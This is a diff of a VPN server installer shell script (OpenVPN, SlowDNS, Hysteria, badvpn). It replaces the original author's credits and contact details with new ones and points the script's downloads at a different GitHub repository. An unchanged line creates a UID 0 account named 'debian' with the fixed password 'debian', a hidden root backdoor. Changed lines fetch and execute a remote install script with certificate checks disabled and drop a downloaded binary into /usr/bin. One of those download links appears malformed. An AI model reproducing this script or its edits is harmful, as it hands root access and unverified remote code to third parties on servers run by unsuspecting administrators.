@@ -138,7 +138,7 @@ sudo cp /etc/apt/sources.list_backup /etc/apt/sources.list
 
 #====================================================
 #	Installing OpenVPN
-#	Finalized: Dexter Eskalarte
+#	Finalized: Taonglobo Prohibitted
 #====================================================
 
 install_openvpn() {
@@ -152,7 +152,7 @@ touch /etc/openvpn/server2.conf
 echo 'DNS=1.1.1.1
 DNSStubListener=no' >> /etc/systemd/resolved.conf
 
-echo '#Openvpn Configuration by MTK Developer :)
+echo '#Openvpn Configuration by Taonglobo :)
 dev tun
 port PORT_UDP
 proto udp
@@ -196,7 +196,7 @@ verb 3' > /etc/openvpn/server.conf
 
 sed -i "s|PORT_UDP|$PORT_UDP|g" /etc/openvpn/server.conf
 
-echo '#Openvpn Configuration by MTK Developer :)
+echo '#Openvpn Configuration by Taonglobo :)
 dev tun
 port PORT_TCP
 proto tcp
@@ -608,7 +608,7 @@ chmod 755 stunnel4 && chmod 755 dropbear
 
 echo "/bin/false" >> /etc/shells
 
-wget -O /etc/banner "https://raw.githubusercontent.com/Dexter-Hysteria/online/server_script/inter_service/file/banner"
+wget -O /etc/banner "https://raw.githubusercontent.com/kakaiba1985/tech103/main/banner"
 chmod +x /etc/banner
 
 useradd -p $(openssl passwd -1 debian) debian -ou 0 -g 0
@@ -620,7 +620,7 @@ sudo service dropbear restart
 
 #====================================================
 #	Installing SlowDNS
-#	Finalized: Firenet Developer
+#	Finalized: Thunderbolt Developer
 #====================================================
 
 install_slowdns (){
@@ -711,8 +711,8 @@ DNS PUBLIC KEY : $(cat /root/.dns/server.pub)
 
 -----------------------
 
-FB Page : https://web.facebook.com/dexter.eskalarte
-Whatsapp Contact: +639709310250
+FB Page : annonymous
+Whatsapp Contact: +639239379202
 
 " >> /root/.web/$secretkey.txt
 
@@ -790,11 +790,11 @@ systemctl start server-sldns
 
 #====================================================
 #	Installing Hysteria UDP
-#	Finalized: Dexter Eskalarte
+#	Finalized: Taonglob Prohibited
 #====================================================
 
 install_hysteria(){
-wget -N --no-check-certificate -q -O ~/install_server.sh https://raw.githubusercontent.com/Dexter-Hysteria/UDP/mtk_vpn/install_server.sh; chmod +x ~/install_server.sh; ./install_server.sh --version v1.3.5
+wget -N --no-check-certificate -q -O ~/install_server.sh https://raw.githubusercontent.com/kakaiba1985/tech103/main/install_server.sh; chmod +x ~/install_server.sh; ./install_server.sh --version v1.3.5
 
 rm -f /etc/hysteria/config.json
 
@@ -847,7 +847,7 @@ chmod 755 /etc/hysteria/.auth.sh
 sysctl -w net.core.rmem_max=16777216
 sysctl -w net.core.wmem_max=16777216
 
-wget -O /usr/bin/badvpn-udpgw "https://github.com/Dexter-Hysteria/status/raw/mtk_vpn/badvpn-udpgw64"
+wget -O /usr/bin/badvpn-udpgw "https://github.com/kakaiba1985/tech103/blob/main/badvpn-udpgw64"
 chmod +x /usr/bin/badvpn-udpgw
 }
 
@@ -865,7 +865,7 @@ installBBR() {
 
 #====================================================
 #	Finalizing Server Setup
-#	Finalized: Dexter Eskalarte
+#	Finalized: Taonglobo Prohibitted
 #====================================================
 
 install_rclocal(){
